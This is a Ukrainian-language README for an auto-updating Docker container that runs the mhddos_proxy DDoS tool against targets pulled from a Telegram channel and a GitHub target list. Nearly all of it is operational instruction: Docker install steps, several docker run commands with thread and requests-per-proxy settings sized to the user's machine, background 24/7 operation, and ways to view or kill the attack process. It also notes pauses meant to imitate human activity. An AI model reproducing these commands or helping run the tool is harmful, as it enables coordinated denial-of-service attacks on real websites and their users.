# Опис docker

### ЯКЩО ВИ КОРИСТУВАЧ WINDOWS, ТО ЗАБУДЬТЕ ПРО ДОКЕР, БО ЦЕ ВІРТУАЛКА, ЯКА ЖРЕ УВЕСЬ ПРОЦЕССОР, ТА ЙДІТЬ СЮДИ: https://github.com/alexnest-ua/runner_for_windows  
### ЯКЩО ВИ КОРИСТУВАЧ MAC - ЙДІТЬ СЮДИ: https://github.com/alexnest-ua/auto_mhddos_mac
### ЯКЩО ВИ КОРИСТУВАЧ LINUX - ЙДІТЬ СЮДИ: https://github.com/alexnest-ua/auto_mhddos_alexnest
  
### ЯКЩО ВИ ТАКИ ХОЧЕТЕ НАСИЛУВАТИ СВІЙ ПРОЦЕСОР ДОКЕРОМ - РОБІТЬ ТЕ ЩО НИЖЧЕ:  

ПОВНІСТЮ АВТООНОВЛЮВАНИЙ (оновлює цілі та себе) docker-контейнер для будь-яких машин, що керує [mhddos_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy) та [proxy_finder](https://github.com/porthole-ascend-cinnamon/proxy_finder)   
Також він автоматично оновлює не лише свій скрипт та цілі, а й скрипт mhddos_proxy та proxy_finder 
Також скрипт імітує роботу людини (вимикає увесь ДДоС на 1-2 (рандомно) хвилин), щоб дати машині трохи відпочити
Скрипт розподіляє ваші машини по цілям: https://github.com/alexnest-ua/targets/blob/main/targets_docker (цілі беруться звідси: https://t.me/ddos_separ)  
Увесь source code знаходиться тут: https://github.com/alexnest-ua/auto_mhddos_alexnest/tree/docker  
  
[**Налаштування**](#%D0%BD%D0%B0%D0%BB%D0%B0%D1%88%D1%82%D1%83%D0%B2%D0%B0%D0%BD%D0%BD%D1%8F-%D0%B2%D1%81%D1%82%D0%B0%D0%BD%D0%BE%D0%B2%D0%BB%D0%B5%D0%BD%D0%BD%D1%8F)  
[**Запуск у фон**](#%D0%B7%D0%B0%D0%BF%D1%83%D1%81%D0%BA-%D0%BD%D0%B0-%D1%80%D0%BE%D0%B1%D0%BE%D1%82%D1%83-%D1%83-%D1%84%D0%BE%D0%BD%D1%96-247-%D0%BD%D0%B0-linux-%D1%81%D0%B5%D1%80%D0%B2%D0%B5%D1%80%D1%96-%D1%82%D0%B0-%D0%B4%D0%BE-%D0%B7%D0%B0%D0%B2%D0%B5%D1%80%D1%88%D0%B5%D0%BD%D0%BD%D1%8F-%D1%80%D0%BE%D0%B1%D0%BE%D1%82%D0%B8-%D0%BD%D0%B0-windows---%D0%BC%D0%BE%D0%B6%D0%BD%D0%B0-%D0%B7%D0%B0%D0%BA%D1%80%D0%B8%D0%B2%D0%B0%D1%82%D0%B8-%D1%82%D0%B5%D1%80%D0%BC%D1%96%D0%BD%D0%B0%D0%BB)  
[**Приклади команд НЕ у фон з --debug та без**](#%D0%BF%D1%80%D0%B8%D0%BA%D0%BB%D0%B0%D0%B4%D0%B8-%D0%BA%D0%BE%D0%BC%D0%B0%D0%BD%D0%B4-%D0%B7-%D1%80%D1%96%D0%B7%D0%BD%D0%B8%D0%BC%D0%B8-%D0%BF%D0%B0%D1%80%D0%B0%D0%BC%D0%B5%D1%82%D1%80%D0%B0%D0%BC%D0%B8%D0%B4%D0%BB%D1%8F-linux-%D0%B4%D0%BE%D0%B4%D0%B0%D0%B2%D0%B0%D0%B9%D1%82%D0%B5-sudo-%D0%B0%D0%B1%D0%BE-%D0%BA%D1%80%D0%B0%D1%89%D0%B5-%D1%81%D1%82%D0%B0%D0%B2%D1%82%D0%B5-%D0%BD%D0%B0-%D0%BF%D1%80%D1%8F%D0%BC%D1%83-httpsgithubcomalexnest-uaauto_mhddos_alexnest)  
[**Подивитися що там працює у фоні(для Linux додайте sudo на початку) та ВБИТИ процес**](#%D0%BF%D0%BE%D0%B4%D0%B8%D0%B2%D0%B8%D1%82%D0%B8%D1%81%D1%8F-%D1%89%D0%BE-%D1%82%D0%B0%D0%BC-%D0%BF%D1%80%D0%B0%D1%86%D1%8E%D1%94-%D1%83-%D1%84%D0%BE%D0%BD%D1%96%D0%B4%D0%BB%D1%8F-linux-%D0%B4%D0%BE%D0%B4%D0%B0%D0%B9%D1%82%D0%B5-sudo-%D0%BD%D0%B0-%D0%BF%D0%BE%D1%87%D0%B0%D1%82%D0%BA%D1%83-%D1%82%D0%B0-%D0%B2%D0%B1%D0%B8%D1%82%D0%B8-%D0%BF%D1%80%D0%BE%D1%86%D0%B5%D1%81)

Канал, де координуються цілі: https://t.me/ddos_separ (звідти і беруться сюди цілі, тому якщо у вас на Linux запущено цей скрипт - то можете відпочивати, він все зробить за вас)  
Чат, де ви можете задати свої питання: https://t.me/+8swDHSe_ROI5MmJi  
Також можете писати мені в особисті у телеграм, я завжди усім відповідаю: @brainqdead  
  
Туторіал по створенню автоматичних та автономних Linux-серверів: https://auto-ddos.notion.site/dd91326ed30140208383ffedd0f13e5c  

## Налаштування (встановлення)
  
* щоб скачати на Windows / Mac:  
https://www.docker.com/get-started/ (якщо виникають якісь проблеми: пишіть мені @brainqdead (телеграм))

* щоб скачати на Linux-машину(але краще ставте напряму: https://github.com/alexnest-ua/auto_mhddos_alexnest ):  
```
sudo apt update -y
sudo apt upgrade -y
sudo curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
sudo echo 'deb [arch=amd64] https://download.docker.com/linux/debian buster stable' | sudo tee /etc/apt/sources.list.d/docker.list
sudo apt update -y
sudo apt remove docker docker-engine docker.io -y
sudo apt install docker-ce -y
sudo systemctl unmask docker.service
sudo systemctl unmask docker.socket
sudo systemctl start docker.service
sudo systemctl start docker
sudo systemctl enable docker
sudo docker run hello-world
docker run -it --rm --pull always alexnestua/auto_mhddos
```
  
*чекаємо 5-10 хвилин поки все встановиться.*  

## Запуск на роботу у фоні (24/7 на Linux-сервері та до завершення роботи на Windows) - можна закривати термінал
Запуск автоматичного ДДоСу(без виведення на екран):  
```
docker run -itd --rm --pull always --name alexnestua ghcr.io/alexnest-ua/auto_mhddos_alexnest:latest 
```
* Буде запущено атаку з наступними параметрами за замовчуванням: threads=1500 rpc=1000 debug="" vpn=""(1500 потоків, 1000 запитів на проксі перед відправкою на ціль, без дебагу, без атаки через ваш ІР) та автоматично запустить паралельно наш [proxy_finder](https://github.com/porthole-ascend-cinnamon/proxy_finder)  

**!!!УВАГА!!!** контейнер підтримує наступні параметри (САМЕ У ТАКОМУ ПОРЯДКУ ТА ЛИШЕ У ТАКІЙ КІЛЬКОСТІ(мінімум 3)), але можно і без них:  
docker run -it --rm --pull always --name alexnest alexnestua/auto_mhddos [num_of_copies] [threads] [rpc] [debug]  
- num_of_copies - кількість атакуємих списків цілей за один прохід (але не менше 1, та не більше 3, бо більше 3-ох знижує ефективність)
- threads - кількість потоків (але не менше 5000, та не більше 4000)
- rpc - кількість запитів на проксі перед відправкою на ціль (але не менше 1000, та не більше 2500)
- debug - можливість дебагу (якщо хочете бачити повний інфу по атаці - у 4-ий параметр додайте --debug)
  
### Приклади команд з різними параметрами(для Linux додавайте sudo, або краще ставте на пряму: https://github.com/alexnest-ua/auto_mhddos_alexnest):
  
* У всіх варіантах буде автоматично запущено паралельно наш [proxy_finder](https://github.com/porthole-ascend-cinnamon/proxy_finder)  
  
1. ***Для лінивих*** (буде обрано за замовчуванням: num_of_copies=1, threads=1500 rpc=1000 debug="" (1 ціль, 1500 потоків, 1000 запитів на проксі перед відправкою на ціль, без дебагу)
```
docker run -it --rm --pull always --name alexnestua ghcr.io/alexnest-ua/auto_mhddos_alexnest:latest
```
**CPUs** - це ядра вашого процесора - зазвичай ядер у два рази менше ніж потоків

2. Слаба машина(1 CPU), саме ці параметри за замовчуванням:
```
docker run -it --rm --pull always --name alexnestua ghcr.io/alexnest-ua/auto_mhddos_alexnest:latest 1 1000 1000
```

3. Середня машина(2-4 CPUs):
```
docker run -it --rm --pull always --name alexnestua ghcr.io/alexnest-ua/auto_mhddos_alexnest:latest 1 1500 2000
```

4. Нормальна машина(4-8 CPUs):
```
docker run -it --rm --pull always --name alexnestua ghcr.io/alexnest-ua/auto_mhddos_alexnest:latest 2 2000 2000
```

5. Потужна машина(9+ CPUs):
```
docker run -it --rm --pull always --name alexnestua ghcr.io/alexnest-ua/auto_mhddos_alexnest:latest all 4000 2500
```

Після цього, якщо хочете вбити процес - натискайте Ctrl+C  (у його відкритій вкладці) або якщо не спрацює - закривайте вікно.  

*також ви можете змінювати параметри на будь-які інші значення, але я рекомендую саме ці.*  
*також можете додавати останнім **4-тим** параметром --debug, що слідкувати за ходом атаки, наприклад:*  
```
docker run -it --rm --pull always --name alexnestua ghcr.io/alexnest-ua/auto_mhddos_alexnest:latest 1 1500 1000 --debug
```

* Приклад **БЕЗ** параметру --debug:  
![image](https://user-images.githubusercontent.com/74729549/168069087-1d1d641e-4ded-43b8-99e4-1d0688e3d2f0.png)  
***наступні 5 хвилин буде виводитись лише інформація від proxy_finder про пошук проксі, але атака теж йде паралельно!***  
* Приклад **З** параметром --debug:  
![image](https://user-images.githubusercontent.com/74729549/168068441-0be60ba6-49c7-41de-a89c-c50410a50fef.png)  

Далі кожні 5 хвилин воно буде оновлювати список проксі, а кожні 20 хвилин - цілі атаки    

### Подивитися що там працює у фоні(для Linux додайте sudo на початку) та ВБИТИ процес:  
```shell
docker ps  -a
```
щоб вбити запущені раніше фонові Docker підпроцеси на Linux прописуєте:  
```shell
sudo docker kill $(docker ps -aqf name=alexnestua)
```
або на Windows зайти у Docker Dekstop -> Containers / Apps -> Видалити container з ім'ям alexnestua



## Список цілей  

  
ghcr.io/alexnest-ua/auto_mhddos_alexnest:latest підтримує єдиний [список цілей](https://github.com/alexnest-ua/targets/blob/main/targets_docker), який можна тримати на github і постійно оновлювати.  
  
    
Цілі не обов'язково видаляти із списку. Їх можна просто закоментувати і розкоментувати пізніше, якщо вони знов знадобляться. Скрипт використовує лише строки, які починаються не на #.  

## Thanks

Special thanks to https://github.com/OleksandrBlack and https://twitter.com/SprechenFuehrer  
